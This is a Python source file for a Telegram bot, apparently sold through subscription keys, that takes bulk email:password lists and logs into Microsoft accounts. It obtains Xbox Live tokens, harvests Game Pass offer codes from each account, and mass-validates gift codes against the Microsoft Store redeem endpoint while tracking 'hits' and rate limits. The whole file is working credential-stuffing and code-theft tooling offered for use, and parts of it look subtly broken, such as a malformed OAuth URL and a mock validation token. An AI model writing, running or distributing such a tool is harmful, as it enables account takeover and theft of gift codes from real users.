#!/usr/bin/env python3
"""
TELEGRAM XBOX CODE FETCHER & VALIDATOR - ULTRA CPM RAILWAY EDITION (LIVE RESULTS UPDATE)
Fully English, highly parallelized, asynchronous Telegram Bot implementation.
"""

import os
import re
import sys
import json
import time
import uuid
import random
import string
import asyncio
import logging
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from typing import Optional, Tuple, List

import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("TurboBot")

# ENVIRONMENT VARIABLES
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID = os.getenv("CHAT_ID", "YOUR_OWNER_CHAT_ID_HERE")

try:
    OWNER_ID = int(CHAT_ID)
except ValueError:
    logger.error("CHAT_ID must be a valid integer!")
    OWNER_ID = 0

DB_FILE = "bot_database.json"
default_db = {"subscriptions": {}, "generated_keys": {}, "config": {"max_concurrent_tasks": 50}}

def load_db() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f: return json.load(f)
        except: pass
    return default_db

def save_db(data: dict):
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)
    except: pass

db = load_db()
if "subscriptions" not in db: db["subscriptions"] = {}
if "generated_keys" not in db: db["generated_keys"] = {}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class BotStates(StatesGroup):
    MAIN_MENU = State()
    AWAITING_ACCOUNTS_FETCH = State()
    AWAITING_CODES_VALIDATE = State()
    AWAITING_SORT_ONLY = State()
    ADMIN_GENERATE_KEY = State()

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '?redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '?scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID: return True
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0 or expiry > time.time(): return True
    return False

def get_subscription_status(user_id: int) -> str:
    if user_id == OWNER_ID: return "👑 Owner (Lifetime)"
    user_str = str(user_id)
    if user_str in db["subscriptions"]:
        expiry = db["subscriptions"][user_str]
        if expiry == 0: return "✅ Lifetime Premium"
        elif expiry > time.time():
            dt = datetime.fromtimestamp(expiry)
            return f"✅ Active until {dt.strftime('%Y-%m-%d %H:%M:%S')}"
    return "❌ No Active Subscription"

def generate_reference_id() -> str:
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1: result_chars.append(n[(e - 1) // 8])
        else: result_chars.append(o[e])
    return "".join(result_chars)

# --- CORE ASYNC FETCHERS ---
async def async_fetch_oauth_tokens(session: aiohttp.ClientSession) -> Tuple[Optional[str], Optional[str]]:
    try:
        async with session.get(MICROSOFT_OAUTH_URL, timeout=12) as response:
            text = await response.text()
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if not match: return None, None
            ppft = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if not match: return None, None
            return match.group(1), ppft
    except: return None, None

async def async_fetch_login(session: aiohttp.ClientSession, email: str, password: str, url_post: str, ppft: str) -> Optional[str]:
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        async with session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=12) as resp:
            final_url = str(resp.url)
            if '#' in final_url:
                token = parse_qs(urlparse(final_url).fragment).get('access_token', ['None'])[0]
                if token != 'None': return token
            return None
    except: return None

async def async_get_xbox_tokens(session: aiohttp.ClientSession, rps_token: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        headers = {'Content-Type': 'application/json'}
        payload_auth = {'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                        'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}}
        async with session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload_auth, headers=headers, timeout=15) as resp:
            if resp.status != 200: return None, None
            resp_json = await resp.json()
            user_token = resp_json.get('Token')
        
        payload_xsts = {'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                        'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}}
        async with session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers=headers, timeout=15) as resp:
            if resp.status != 200: return None, None
            data = await resp.json()
            return data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token')
    except: return None, None

async def async_fetch_codes_from_xbox(session: aiohttp.ClientSession, uhs: str, xsts_token: str) -> List[str]:
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        headers = {'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}
        async with session.get('https://profile.gamepass.com/v2/offers', headers=headers, timeout=15) as resp:
            if resp.status != 200: return []
            resp_json = await resp.json()
            
        codes = []
        for offer in resp_json.get('offers', []):
            resource = offer.get('resource')
            if resource: codes.append(resource)
        return codes
    except: return []

async def async_account_fetch_worker(account_str: str, stats_tracker: dict) -> List[str]:
    if ':' not in account_str: 
        stats_tracker["bad"] += 1
        return []
    email, password = account_str.split(':', 1)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            url_post, ppft = await async_fetch_oauth_tokens(session)
            if not url_post or not ppft: 
                stats_tracker["bad"] += 1
                return []
            rps = await async_fetch_login(session, email, password, url_post, ppft)
            if not rps: 
                stats_tracker["bad"] += 1
                return []
            uhs, xsts = await async_get_xbox_tokens(session, rps)
            if not uhs or not xsts: 
                stats_tracker["bad"] += 1
                return []
            codes = await async_fetch_codes_from_xbox(session, uhs, xsts)
            
            stats_tracker["checked"] += 1
            if codes:
                stats_tracker["found_codes"] += len(codes)
            return codes
    except:
        stats_tracker["bad"] += 1
        return []

# --- CORE ASYNC VALIDATOR ---
async def async_validate_code_primary(session: aiohttp.ClientSession, code: str, store_state: dict, token: str, stats_tracker: dict) -> dict:
    try:
        headers = {
            "x-ms-tracking-id": store_state.get('tracking_id', ''),
            "authorization": f"WLID1.0=t={token}",
            "x-ms-market": "US",
            "x-ms-reference-id": generate_reference_id(),
            "user-agent": "Mozilla/5.0",
            "content-type": "application/json",
            "accept": "*/*"
        }
        payload = {
            "market": "US", "language": "en-US",
            "flights": ["sc_buynowuiprod", "sc_checkoutredeem"],
            "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False,
            "buyNowScenario": "redeem", "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
        }
        url = 'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken'
        async with session.post(url, headers=headers, json=payload, timeout=15) as response:
            stats_tracker["checked"] += 1
            if response.status == 429: 
                stats_tracker["rate_limit"] += 1
                return {"status": "RATE_LIMITED", "message": "429 Rate Limit"}
            if response.status != 200: 
                stats_tracker["bad"] += 1
                return {"status": "ERROR", "message": f"HTTP {response.status}"}
            data = await response.json()
            
        if "tokenType" in data and data["tokenType"] == "CSV":
            stats_tracker["valid"] += 1
            return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
        if "products" in data and len(data["products"]) > 0:
            stats_tracker["valid"] += 1
            product_title = data["products"][0].get("title", "Unknown Title")
            return {"status": "VALID", "message": f"{code} | {product_title}"}
        
        stats_tracker["bad"] += 1
        return {"status": "INVALID", "message": f"{code} | INVALID"}
    except: 
        stats_tracker["checked"] += 1
        stats_tracker["bad"] += 1
        return {"status": "ERROR", "message": "Timeout/Exception"}

def extract_game_type(game_name: str) -> str:
    game_name = game_name.upper()
    if 'XBOX GAME PASS' in game_name: return '🎮 Xbox Game Pass'
    if 'RAINBOW SIX' in game_name: return '🔫 Rainbow Six Siege'
    if 'WARFRAME' in game_name: return '⚔️ Warframe Pack'
    return '📦 Other dynamic digital content'

# --- LIVE REPORTING TASK ---
async def live_reporter(progress_msg: types.Message, stats: dict, total: int, operation_type: str):
    """Updates the Telegram status message every 5 seconds dynamically."""
    start_time = time.time()
    while stats["checked"] + stats["bad"] + stats["rate_limit"] < total:
        await asyncio.sleep(5)
        elapsed = round(time.time() - start_time, 1)
        
        if operation_type == "fetch":
            text = (
                f"⚡ <b>[LIVE] FETCHING CODES...</b>\n"
                f"----------------------------------------\n"
                f"⏳ Time Elapsed: {elapsed}s\n"
                f"🔄 Progress: {stats['checked'] + stats['bad']}/{total} accounts\n"
                f"🟩 Checked Successfully: {stats['checked']}\n"
                f"🔥 Total Codes Found: <b>{stats['found_codes']}</b>\n"
                f"❌ Failed Accounts: {stats['bad']}\n"
                f"----------------------------------------\n"
                f"<i>⚙️ Updating metrics live every 5 seconds...</i>"
            )
        else: # validate
            text = (
                f"🔍 <b>[LIVE] VALIDATING CODES...</b>\n"
                f"----------------------------------------\n"
                f"⏳ Time Elapsed: {elapsed}s\n"
                f"🔄 Progress: {stats['checked']}/{total} codes\n"
                f"🟩 Valid Codes (Hits): <b>{stats['valid']}</b>\n"
                f"⚠️ Rate Limited (429): {stats['rate_limit']}\n"
                f"❌ Dead/Invalid/Errors: {stats['bad']}\n"
                f"----------------------------------------\n"
                f"<i>⚙️ Updating metrics live every 5 seconds...</i>"
            )
        try:
            await progress_msg.edit_text(text, parse_mode=ParseMode.HTML)
        except:
            pass # Ignore telegram limits if text is identical

# --- TG HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    status = get_subscription_status(user_id)
    
    welcome_text = (
        f"⚡ <b>XBOX TURBO BOT PLATFORM</b> ⚡\n\n"
        f"Access Status: <code>{status}</code>\n\n"
        f"<b>💡 TIP:</b> You can now upload direct <b>.txt files</b> for all operations below!"
    )
    builder = InlineKeyboardBuilder()
    if is_subscribed(user_id):
        builder.button(text="🚀 Fetch Codes", callback_data="menu_fetch")
        builder.button(text="🔍 Validate Codes", callback_data="menu_validate")
        builder.button(text="🔄 Sort Codes", callback_data="menu_sort")
    else:
        builder.button(text="🔑 Redeem Subscription", callback_data="menu_redeem_info")
    if user_id == OWNER_ID:
        builder.button(text="👑 Admin Panel", callback_data="admin_panel")
    builder.adjust(2)
    await message.answer(welcome_text, parse_mode=ParseMode.HTML, reply_markup=builder.as_markup())

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split()
    if len(args) < 2: return await message.answer("❌ Usage: `/redeem [KEY]`")
    key = args[1].strip()
    if key in db["generated_keys"]:
        days = db["generated_keys"][key]
        del db["generated_keys"][key]
        db["subscriptions"][str(message.from_user.id)] = time.time() + (days * 86400)
        save_db(db)
        await message.answer(f"🎉 Activated successfully for <b>{days} days</b>!", parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Invalid key!")

@dp.callback_query()
async def process_callbacks(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if callback.data == "menu_fetch":
        await callback.message.answer("📥 Send your accounts as text <b>OR upload a .txt file</b> (format <code>email:pass</code>):", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_ACCOUNTS_FETCH)
    elif callback.data == "menu_validate":
        await callback.message.answer("🔍 Send your raw codes as text <b>OR upload a .txt file</b>:", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_CODES_VALIDATE)
    elif callback.data == "menu_sort":
        await callback.message.answer("🔄 Send your verified list as text <b>OR upload a .txt file</b>:", parse_mode=ParseMode.HTML)
        await state.set_state(BotStates.AWAITING_SORT_ONLY)
    elif callback.data == "admin_panel" and user_id == OWNER_ID:
        builder = InlineKeyboardBuilder()
        builder.button(text="🔑 Gen Key", callback_data="admin_gen_key")
        await callback.message.answer("🛠 Owner Admin Panel", reply_markup=builder.as_markup())
    elif callback.data == "admin_gen_key" and user_id == OWNER_ID:
        await callback.message.answer("🔢 Enter duration in days:")
        await state.set_state(BotStates.ADMIN_GENERATE_KEY)
    await callback.answer()

async def get_input_lines(message: types.Message) -> List[str]:
    if message.document:
        if not message.document.file_name.endswith('.txt'): return []
        file_info = await bot.get_file(message.document.file_id)
        file_buffer = await bot.download_file(file_info.file_path)
        content = file_buffer.read().decode('utf-8', errors='ignore')
        return content.strip().split('\n')
    elif message.text:
        return message.text.strip().split('\n')
    return []

# --- PIPELINE EXECUTIONS WITH LIVE RESULTS ---
@dp.message(BotStates.AWAITING_ACCOUNTS_FETCH)
async def process_accounts_fetch(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    valid_accounts = [line.strip() for line in lines if ':' in line]
    if not valid_accounts:
        await message.answer("❌ No valid <code>email:pass</code> found in text or file.", parse_mode=ParseMode.HTML)
        return await state.clear()
        
    progress_msg = await message.answer("⚡ <b>Initializing Worker Engines... Live stats launching...</b>", parse_mode=ParseMode.HTML)
    
    # Track stats for live view
    stats = {"checked": 0, "bad": 0, "found_codes": 0, "rate_limit": 0}
    total_count = len(valid_accounts)
    
    # Fire and forget the reporter task
    reporter_task = asyncio.create_task(live_reporter(progress_msg, stats, total_count, "fetch"))
    
    tasks = [async_account_fetch_worker(acc, stats) for acc in valid_accounts]
    results = await asyncio.gather(*tasks)
    
    reporter_task.cancel() # Stop the reporter loop
    
    all_codes = [code for sublist in results if sublist for code in sublist]
    await state.clear()
    
    if all_codes:
        out = "\n".join(all_codes)
        if len(out) < 3000: await message.answer(f"✅ <b>Harvested Complete List:</b>\n<code>{out}</code>", parse_mode=ParseMode.HTML)
        else:
            with open("codes.txt", "w") as f: f.write(out)
            await message.answer_document(types.FSInputFile("codes.txt"), caption=f"✅ Done! Fetched {len(all_codes)} codes.")
    else:
        await message.answer("⚠️ Process complete. 0 codes harvested from current lines.")

@dp.message(BotStates.AWAITING_CODES_VALIDATE)
async def process_codes_validate(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    codes = [line.strip().split('|')[0].strip() for line in lines if line.strip()]
    if not codes:
        await message.answer("❌ No codes detected.")
        return await state.clear()
        
    progress_msg = await message.answer("🔍 <b>Initializing Validator Loops... Live metrics launching...</b>", parse_mode=ParseMode.HTML)
    
    stats = {"checked": 0, "bad": 0, "valid": 0, "rate_limit": 0}
    total_count = len(codes)
    
    reporter_task = asyncio.create_task(live_reporter(progress_msg, stats, total_count, "validate"))
    
    st, tok = {"tracking_id": uuid.uuid4().hex}, "MOCK_TOK_" + uuid.uuid4().hex
    async with aiohttp.ClientSession() as session:
        tasks = [async_validate_code_primary(session, c, st, tok, stats) for c in codes]
        responses = await asyncio.gather(*tasks)
        
    reporter_task.cancel()
    
    valids = []
    for r in responses:
        if r.get("status") in ["VALID", "BALANCE_CODE"]: valids.append(r.get("message"))
        
    await state.clear()
    res_text = f"📊 <b>Final System Report:</b>\n🟩 Total Valid (Hits): {len(valids)}\n🟥 Total Dead/Errors: {total_count - len(valids)}\n\n"
    if valids: res_text += "<code>" + "\n".join(valids[:20]) + "</code>"
    await message.answer(res_text, parse_mode=ParseMode.HTML)

@dp.message(BotStates.AWAITING_SORT_ONLY)
async def process_sorting(message: types.Message, state: FSMContext):
    lines = await get_input_lines(message)
    groups = {}
    for line in lines:
        if not line.strip(): continue
        if '|' in line:
            c, name = line.split('|', 1)
            g = extract_game_type(name.strip())
            if g not in groups: groups[g] = []
            groups[g].append(line.strip())
        else:
            if '📦 Unsorted' not in groups: groups['📦 Unsorted'] = []
            groups['📦 Unsorted'].append(line.strip())
            
    await state.clear()
    out = "<b>🎮 SORTED RESULTS 🎮</b>\n\n"
    for cat, items in groups.items():
        out += f"<b>{cat} ({len(items)})</b>\n<code>" + "\n".join(items[:10]) + "</code>\n\n"
    await message.answer(out, parse_mode=ParseMode.HTML)

@dp.message(BotStates.ADMIN_GENERATE_KEY)
async def process_admin_key(message: types.Message, state: FSMContext):
    if message.from_user.id != OWNER_ID: return
    try:
        days = int(message.text.strip())
        key = "TURBO-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
        db["generated_keys"][key] = days
        save_db(db)
        await state.clear()
        await message.answer(f"🔑 Key: <code>{key}</code> ({days} Days)", parse_mode=ParseMode.HTML)
    except: await message.answer("Invalid number.")

if __name__ == '__main__':
    asyncio.run(dp.start_polling(bot))

